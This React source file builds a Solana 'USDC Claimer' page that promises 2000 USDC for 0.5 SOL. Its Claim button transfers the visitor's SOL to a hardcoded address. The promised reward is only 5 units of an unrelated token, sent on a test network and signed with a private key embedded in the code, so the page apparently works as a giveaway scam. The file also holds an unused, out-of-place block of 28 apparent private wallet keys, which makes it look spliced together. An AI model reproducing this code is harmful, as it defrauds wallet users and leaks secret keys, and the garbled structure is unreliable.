/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4uxAzBLj8iKsGatWmASguMNaV4PQZQ8777oybAjFN67i1aboGm5ftxgGb2MazT8acuoSXrFVKX9hrj825VPUNRvG"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5vbVcKMagusVSnfztK115HeQcMGwNQ596xxsF7VHreEeAVLFTuBSoS6K3DDUPbNYg68z9RitsUPg1oJzdsUdzvm2",
  "key1": "5zh1bFdSzotVMzMpB6D2e2q4781DHL7wQFjou7U11pUj7VWsuhLdSPQkSYQywKdyj6yayMzobEvGJDemXMjBNu6p",
  "key2": "3DbKSNhHHpYyidGTANPD6vLmg1HPrfY4m6NW9BmHeyVvNqY9KrKR5fYbrKxcUPuvLt4Co7mwaJkmadmKkeGgiVEw",
  "key3": "44x486Y46MppJydeceUaL3QM1iDEQw7j2j64if8yZUYNMW1R1jvk1aQCSh1VJFu79mbEsWofbAUD4puccsfPJfkm",
  "key4": "4nRCYx1MXjqVv6GCDzanBuex9Ai1J82cBSFiwEii8eTJpeWmaojEj9HxmUrLUEfByvF8sqgJuLXhAifK6SzaX3X",
  "key5": "59Ax648zhrCqdyu1QQNdp8vLTnjXNFa9Um8waNh4fSxqmZJ9bobPqr3UXFuXHUuMuHCuNp4b74U49oK69MqUMGXr",
  "key6": "5ovkuqp68zmnGsQABFsNrK8S2UPoJ4az2rWzC7ZycpgKU8PCwQ4mSPmKDVqU45wjcqFWfujzJcbL4gLJdti6DEbH",
  "key7": "4EaEAw2YtK7VpvufJftKrDhZRUf9e6EjxVvxTdigsGxTUUYsnqT38sGVkzjqCEN6gHWZ4VVBDyKRfXUw3fxC5aLh",
  "key8": "2ircRp4C4ZjeBwFMqyR4Rc4QVZpXoV2SS3FM86AzAojC9pkCKPSkg5X9socfAoib7Ahz6EjxrGQu3eGDCfQLeRZM",
  "key9": "DBoqEWjik27azVBd6hVdiQcgsD4n94RJBfCuuitKWGsVgqbGP495Jd4uUkwuZBcjBnrRCdM3nWw7UaJH4tgPErb",
  "key10": "5bjgw4rPAziZHAmaorWynumnjXfivFe1xYWq3oYMkSBedCMt42fNo9cb3bLW34SbtDmuGnragqczycdCwzMAjkRx",
  "key11": "ipCLLeVEYKMFHjCn4bgxvkyXwNThJgmJJqoTCB5ccpbFCxFvJAhg8xn6JL3aD47Hj6QBEiJhyur1RyD43WwRCz8",
  "key12": "58TjuFMyB1kVBCh3AYvN7pPByMy3PRD5TV6K9xsfMScXYSbMdfdxecb8WH5Gs5y9YDNo4yUYLYeoZ2LB8vS6eBN1",
  "key13": "5ic7LYVgAyxGCukwkZtzPWT9b3z2EC7B6R4pavFqracf4dvjHQn6KyWTWoBhxYik9iCgcsugGhm95QFq6eM6b8yb",
  "key14": "2j5kZ8DW4tQfMdHrbN9RctGYAw2ns1yHouGAU6v126ntAtP9XrenT6HqEWw9XPAA6irAoRqDevtAxVaKSuCnSEJx",
  "key15": "4dXfsM4cVys1JAHsQ8VAxoujbkMutyjFTp7icnxP5Hx4qqdao6TnkJMnea59U5k8qhRp6BvRKQRrmLdusaPk4v4X",
  "key16": "2qL2EUJLCoJuefzHx8H4ogNWXPQq3n8qAc3qwsAALHZ4Eozm9mRyPVn8iR2kir2QcKBA6SRtuMiiL1sKLMf5UWMS",
  "key17": "5VPR1B2EbsegMhezG249jL9JxGmzPa6WnhmAH2MzazhKwhcNdUDVcJ34mqe2k99Hus6JS9qaxRiDHCkL48jCsGmY",
  "key18": "eH7r4yDBbmTuZzjCfRV5PBPG2pXgsgpywGa1DhRPmjnGw7VyhhBdMF2RYYNA1WArxgFpgikLNNqTK4Y1vj7VLk5",
  "key19": "4ZFzsjNmoQQQ3Nfyh3e6aYSaXWUrL4e3x6LG51ufesdNoYnUAYSjBhbu9C7JcFStAFgoQL34MytAcQF1naA2hGTK",
  "key20": "51JcYpnUoHeFz288pNVjcAQn21iT8jdeewXVbrDcqNb5QwnM6ikM4qhzqnFNMSDHw8WK5jygVg4kUbPMp6VKo7Xv",
  "key21": "22w5YQUcqtyr9Z2zoMDYBBotfQw8QD8zfH5hr3woJH5ALfon2NSQuMAD1AZuEXFuSQFxRzX3WcjtCtqBtpwSkey7",
  "key22": "tfGafeoGRbogBH5CkFTPUge51eQG2f6Nov5X3gY82X7rwanukgLEwTHXSegdpcYDDDHruqwux4w93y84dcTYSDi",
  "key23": "3LnT862JSJpnXJs7tXdkrWjLCYoPqa7MDid7wqTqNWHPJb3sAdVsiCPhC7jr1NhAM8HJYJg5EY6zn2y2utop4sxg",
  "key24": "25YQ6yAyezM32fjW2Uep4P3muqT6UzSdzoyV2rhJYdeSneTHF9HkVLEVNwmSdaKZxZJKe7jxwe2Cxve6kk1CUUmN",
  "key25": "4p5NEwZhCZFCi9xEkPKkoXrDBXfdacXxTLuDUsaMf1CMZh7dxP65FsyVRPKz1fwKgCVMc1F7GtVTXhFhkLuUrHHr",
  "key26": "4kRqQC6UhwyLFcyUuBXGeg7FxDHsrvTYXLHqqA4je31WcMv2sEEyH6DmN3k7GYuw7mKuxps2k32ZhXV5phW2FDn2",
  "key27": "wBr2BoZoD1NbNnZUyaErbCJhxsL3yjvQTa1J8NqQzQUJnXr9Mwy8wz85kQ85mHpA5xmEZqw6gw7cHWGwRDhJT6M"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
